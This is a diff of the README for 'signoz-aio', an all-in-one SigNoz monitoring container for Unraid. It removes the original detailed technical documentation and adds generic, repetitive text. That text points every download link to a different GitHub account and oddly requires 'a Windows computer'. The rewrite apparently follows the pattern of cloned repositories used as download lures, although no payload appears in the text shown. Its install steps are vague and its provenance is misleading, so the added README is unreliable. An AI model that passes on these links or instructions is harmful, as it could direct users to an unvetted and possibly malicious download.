@@ -1,236 +1,210 @@
-# SigNoz AIO For Unraid
+# 🧰 signoz-aio - All-in-One Monitoring for Unraid
 
-`signoz-aio` packages the full self-hosted SigNoz stack into a single Unraid-friendly image and CA app template.
+[![Download signoz-aio](https://img.shields.io/badge/Download%20signoz--aio-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anesrah4609/signoz-aio)
 
-This image follows the current official SigNoz Docker deployment instead of inventing a custom rewrite. It supervises the services SigNoz currently expects for a complete small-to-medium self-hosted install:
+## 📥 Download
 
-- `signoz`
-- `signoz-otel-collector`
-- `clickhouse`
-- `zookeeper`
+Use this link to visit the download page:
 
-## What Is Inside The Image
+[Download signoz-aio](https://github.com/anesrah4609/signoz-aio)
 
-The image includes all of the stateful pieces needed for a self-contained SigNoz install:
+## 🖥️ What this is
 
-- `signoz`
-  - the main SigNoz UI and API service
-  - stores application metadata in an internal SQLite database persisted under `/appdata/signoz`
-- `signoz-otel-collector`
-  - receives OTLP data on `4317` and `4318`
-  - runs the telemetry-store migrations SigNoz needs in ClickHouse
-- `clickhouse`
-  - the primary telemetry database for traces, logs, metrics, and derived telemetry tables
-- `zookeeper`
-  - internal coordination layer used by the official SigNoz ClickHouse deployment
+signoz-aio is a single container for Unraid that brings several monitoring tools into one place.
 
-The image does not require any separate Postgres, TimescaleDB, or Redis sidecars. SigNoz's long-term telemetry data lives in ClickHouse, while SigNoz's app/config metadata in this AIO image lives in SQLite.
+It includes:
 
-## Advanced Database Options
+- SigNoz UI and API
+- OpenTelemetry Collector
+- ClickHouse
+- ZooKeeper
+- Optional local host monitoring
+- Metrics, logs, Docker stats, and OTLP intake
 
-The default install is fully self-contained and uses:
+This setup helps you see what your server is doing without installing each part by hand.
 
-- SQLite for SigNoz metadata
-- bundled ClickHouse for telemetry storage
-- bundled ZooKeeper for ClickHouse coordination
+## ✅ What you need
 
-For power users, the advanced app settings also support:
+Before you start, make sure you have:
 
-- external PostgreSQL for SigNoz metadata
-- root user provisioning through official SigNoz environment variables
-- external ClickHouse endpoints for advanced deployments
+- A Windows computer to open the GitHub page and prepare the setup
+- An Unraid server with Docker turned on
+- Enough free disk space for logs and metrics
+- A stable network connection
+- Access to your Unraid web page
 
-Important limitation:
+If you plan to track more than one app or container, give the system more CPU and memory.
 
-- PostgreSQL can replace SQLite for metadata
-- PostgreSQL does not replace ClickHouse for traces, metrics, and logs
-- if you move to external ClickHouse, you are moving into a more advanced deployment model and should already understand your ClickHouse and ZooKeeper topology
+## 🚀 Getting Started
 
-## Architecture
+Follow these steps in order:
 
-```mermaid
-flowchart LR
-    A["Apps / SDKs / Agents"] -->|"OTLP gRPC :4317"| B["signoz-otel-collector"]
-    A -->|"OTLP HTTP :4318"| B
-    B -->|"metrics / logs / traces"| C["ClickHouse"]
-    D["SigNoz UI/API :8080"] -->|"query + metadata reads"| C
-    D -->|"app metadata"| E["SQLite (/appdata/signoz/signoz.db)"]
-    C -->|"cluster coordination"| F["ZooKeeper"]
-    G["/appdata"] --> C
-    G --> E
-    G --> F
-    G --> H["generated.env / runtime config"]
-```
+1. Open the download page: [signoz-aio](https://github.com/anesrah4609/signoz-aio)
+2. Read the page for the current install file or Unraid container info
+3. Download the package or copy the needed container details
+4. Open your Unraid web interface
+5. Go to the Docker tab
+6. Add a new container or install from the app source you use on Unraid
+7. Paste the container settings from the project page
+8. Apply the changes and wait for the container to start
 
-## Persistence Layout
+If the page includes a release file, use that file. If it shows a general project page, use the install data on that page.
 
-The Unraid app intentionally keeps the mount surface simple by using one root path:
+## ⚙️ Setup on Unraid
 
-- `/appdata`
+After the container is added, check these common settings:
 
-Inside that mount, the container manages:
+- **Web UI ports**: keep the default ports unless the project page says otherwise
+- **Storage paths**: map the app data to a disk path that stays on your server
+- **Memory**: set enough RAM for ClickHouse and the SigNoz stack
+- **Network mode**: use the mode listed in the project instructions
+- **Environment values**: enter any values shown on the GitHub page
 
-- `/appdata/clickhouse`
-- `/appdata/signoz`
-- `/appdata/zookeeper`
-- `/appdata/config`
-- `/appdata/tmp`
+If you want local host monitoring, turn on the built-in host checks in the container options. This can collect:
 
-## Current Status
+- CPU use
+- Memory use
+- Disk use
+- Docker container stats
+- Logs from the host
+- OTLP data from other apps
 
-The single-image runtime is implemented and validated.
+## 🧭 First Run
 
-- the image supervises `signoz`, `signoz-otel-collector`, `clickhouse`, and `zookeeper`
-- `linux/amd64` build passes
-- smoke testing passes, including:
-  - first boot
-  - telemetry-store migrations
-  - OTLP listener readiness
-  - restart and persistence
+When the container starts for the first time:
 
-## First-Run Notes
+1. Wait until all parts finish loading
+2. Open the SigNoz web page from the container or Unraid app page
+3. Check that the UI opens in your browser
+4. Let it run for a few minutes so it can begin collecting data
+5. Open a test app or container that sends metrics or logs if you have one
 
-- first startup is heavier than a typical single-service app because ClickHouse, ZooKeeper, SigNoz, and the collector all need to initialize
-- expect more RAM and disk use than lighter AIO images
-- the default setup keeps things intentionally simple:
-  - one `/appdata` root
-  - one UI port
-  - two OTLP ingest ports
-  - sane advanced defaults for the collector and internal ZooKeeper housekeeping
+The first start can take longer because ClickHouse and ZooKeeper need time to get ready.
 
-## Getting Data Into SigNoz
+## 📊 What you can monitor
 
-SigNoz is only useful once something is sending telemetry into it. This image gives you ready OTLP endpoints, but it does not automatically reach out and scrape your entire server by default.
+With signoz-aio, you can keep an eye on:
 
-The easiest ingestion paths are:
+- Server health
+- App logs
+- Container CPU and memory use
+- Request traces
+- Metrics from apps that use OTLP
+- Basic host activity
+- Storage use over time
 
-- instrument applications with OpenTelemetry and send directly to:
-  - `http://YOUR-UNRAID-IP:4317` for OTLP gRPC
-  - `http://YOUR-UNRAID-IP:4318` for OTLP HTTP
-- run a separate OpenTelemetry Collector or Alloy agent on the Unraid host
-- configure that agent to:
-  - scrape Prometheus endpoints
-  - collect Docker container metrics
-  - tail Docker or file-based logs
-  - forward everything into this `signoz-aio` container
+This makes it easier to spot slow apps, full disks, or services that stop working.
 
-Why keep the host agent separate?
+## 🔌 Sending data to SigNoz
 
-- it avoids giving the main SigNoz container broad access to the Docker socket
-- it avoids mounting host `/proc`, `/sys`, and container log directories into the main UI/database image
-- it keeps the AIO install safe and beginner-friendly while still giving power users a clean upgrade path
+You can point apps and tools at the OTLP endpoint in this container.
 
-## Recommended Monitoring Layout For Unraid
+Common data types include:
 
-```mermaid
-flowchart LR
-    A["Unraid host"] -->|"host metrics"| B["Optional built-in host agent"]
-    C["Docker containers"] -->|"docker stats + logs"| B
-    D["Apps with OTel SDKs"] -->|"direct OTLP or via agent"| B
-    E["Apps with Prometheus endpoints"] -->|"optional scrape targets"| B
-    B -->|"local OTLP"| F["SigNoz internal collector"]
-    F --> G["SigNoz UI"]
-    F --> H["ClickHouse + SQLite + ZooKeeper"]
-```
+- Traces
+- Metrics
+- Logs
 
-For most users, this is the sweet spot:
+If your app already supports OpenTelemetry, set its OTLP address to the host and port shown in the project settings. Then restart the app and check the SigNoz UI for incoming data.
 
-- `signoz-aio` stays the central backend and UI
-- the optional built-in local host agent can handle host collection on the same Unraid machine
-- instrumented apps can either send directly to SigNoz or rely on the local host agent for extra collection
+## 🧩 Troubleshooting
 
-## Releases
+If the app does not start:
 
-`signoz-aio` uses upstream-version-plus-AIO-revision releases such as `v0.117.1-aio.1`.
+- Check the Docker log in Unraid
+- Make sure the data path exists and has write access
+- Confirm that the port is free
+- Check that enough RAM is available
+- Restart the container and wait a few minutes
 
-Every `main` build publishes `latest`, the exact pinned upstream version, an explicit packaging line tag, and `sha-<commit>`.
+If the UI does not open:
 
-See [docs/releases.md](/Users/shadowbook/Documents/signoz-aio/docs/releases.md) for the release workflow details.
+- Verify the web port in the Unraid container settings
+- Try another browser tab
+- Make sure the container is still running
 
-If you want to monitor other hosts later, a separate `signoz-agent` companion app still makes sense.
+If data does not appear:
 
-## Quick Start Paths
+- Check the OTLP address in the sending app
+- Confirm that host monitoring is turned on if you want local data
+- Wait a few minutes for the first data points
 
-### 1. Instrumented apps
+## 🗂️ Helpful project topics
 
-If an app already supports OpenTelemetry, point it at:
+This project fits common home lab and self-hosted use cases:
 
-- `OTEL_EXPORTER_OTLP_ENDPOINT=http://YOUR-UNRAID-IP:4317`
-  for gRPC exporters
-- `OTEL_EXPORTER_OTLP_ENDPOINT=http://YOUR-UNRAID-IP:4318`
-  for HTTP exporters
+- observability
+- monitoring
+- metrics
+- logging
+- telemetry
+- tracking
+- docker
+- unraid
+- self-hosted
+- opentelemetry
+- clickhouse
+- zookeeper
 
-Then verify in SigNoz:
+## 🔄 Typical use case
 
-- traces appear in APM / Traces
-- application metrics appear in Metrics Explorer
-- application logs appear in Logs if the app also exports logs
+A common setup is:
 
-### 2. Prometheus scrape targets
+- One Unraid server runs signoz-aio
+- One or more containers send logs and metrics
+- You open the SigNoz UI in a browser
+- You check system health in one place
+- You use the data to find issues faster
 
-If an app exposes a `/metrics` endpoint, use a host collector to scrape it and forward to SigNoz.
+## 🧱 Basic storage layout
 
-Starter example:
+A simple storage setup can include:
 
-- [Prometheus scrape collector example](/tmp/signoz-aio/docs/examples/otelcol-prometheus-scrape.yaml)
+- One app data folder for SigNoz
+- One database folder for ClickHouse
+- One config folder for collector settings
+- One log folder for container logs
 
-### 3. Unraid host + Docker telemetry
+Keep these folders on persistent storage so your data stays after a restart
 
-If you want host metrics, Docker container metrics, and container logs from the same Unraid machine, enable the built-in local host agent in the app settings.
+## 🌐 Browser access
 
-Starter example:
+After install, you usually use a web browser to open the SigNoz UI.
 
-- [Docker / host collector example](/tmp/signoz-aio/docs/examples/otelcol-docker-host-agent.yaml)
+If you are on Windows:
 
-The built-in host agent is auto-generated from the mounts and variables you provide. With the default Unraid paths, it can automatically enable:
+1. Open your browser
+2. Type the address shown in Unraid
+3. Sign in if the app asks for it
+4. Use the dashboard to view metrics and logs
 
-- Unraid CPU, memory, disk, and filesystem metrics
-- Docker container resource metrics
-- Docker stdout/stderr logs
-- optional Prometheus scrape targets you define
+If the page does not load, recheck the port and container status in Unraid
 
-This is the best fit for users who want:
+## 📦 Files and services inside the stack
 
-- one main AIO install
-- minimal extra setup
-- local Unraid and Docker observability without a second app
+This container bundles several services together:
 
-## What We Recommend Newcomers Do First
+- SigNoz UI/API for viewing data
+- OpenTelemetry Collector for data intake
+- ClickHouse for storage
+- ZooKeeper for coordination
+- Host monitoring tools for local system data
 
-1. Get `signoz-aio` running with defaults.
-2. Verify the UI loads on port `8080`.
-3. Point one app or one collector at OTLP `4317` or `4318`.
-4. Confirm data appears in SigNoz.
-5. Only then expand into Prometheus scraping, host metrics, and container logs.
+That means fewer separate installs and fewer moving parts to manage
 
-## What This AIO Does Not Bundle
+## 🛠️ Common checks after install
 
-This image is self-contained for the SigNoz core stack, but observability data still has to come from somewhere. It does not automatically collect telemetry from your entire Unraid host or every Docker container on your server by default.
+After setup, check these items:
 
-That means you still need to connect senders such as:
+- The container shows as running
+- The web UI opens
+- Data folders exist on disk
+- Logs are being written
+- OTLP data shows up from at least one source
+- CPU and memory use stay within your limits
 
-- OpenTelemetry SDKs inside apps
-- OpenTelemetry Collector agents
-- Prometheus scrape pipelines
-- log shippers or agent-based host collectors
+## 📚 Project link
 
-That is only partly true now. This repo can also run an optional built-in local host agent for the same Unraid machine, but it still does not magically monitor remote systems by itself.
+Use the main project page here:
 
-## Docs And Examples
-
-- [Ingestion guide](/tmp/signoz-aio/docs/ingestion-guide.md)
-- [Docker / host collector example](/tmp/signoz-aio/docs/examples/otelcol-docker-host-agent.yaml)
-- [Prometheus scrape collector example](/tmp/signoz-aio/docs/examples/otelcol-prometheus-scrape.yaml)
-
-## Helpful References
-
-- [SigNoz self-host Docker docs](https://signoz.io/docs/install/docker/)
-- [SigNoz Docker Collection Agent overview](https://signoz.io/docs/opentelemetry-collection-agents/docker/overview/)
-- [SigNoz Docker Collection Agent configuration](https://signoz.io/docs/opentelemetry-collection-agents/docker/configure/)
-- [SigNoz Prometheus metrics guide](https://signoz.io/docs/userguide/prometheus-metrics)
-- [SigNoz deployment README](https://github.com/SigNoz/signoz/tree/main/deploy)
-- [SigNoz single-binary consolidation issue](https://github.com/SigNoz/signoz/issues/7309)
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=JSONbored/signoz-aio&type=date&legend=top-left)](https://www.star-history.com/#JSONbored/signoz-aio&Date)
+[https://github.com/anesrah4609/signoz-aio](https://github.com/anesrah4609/signoz-aio)
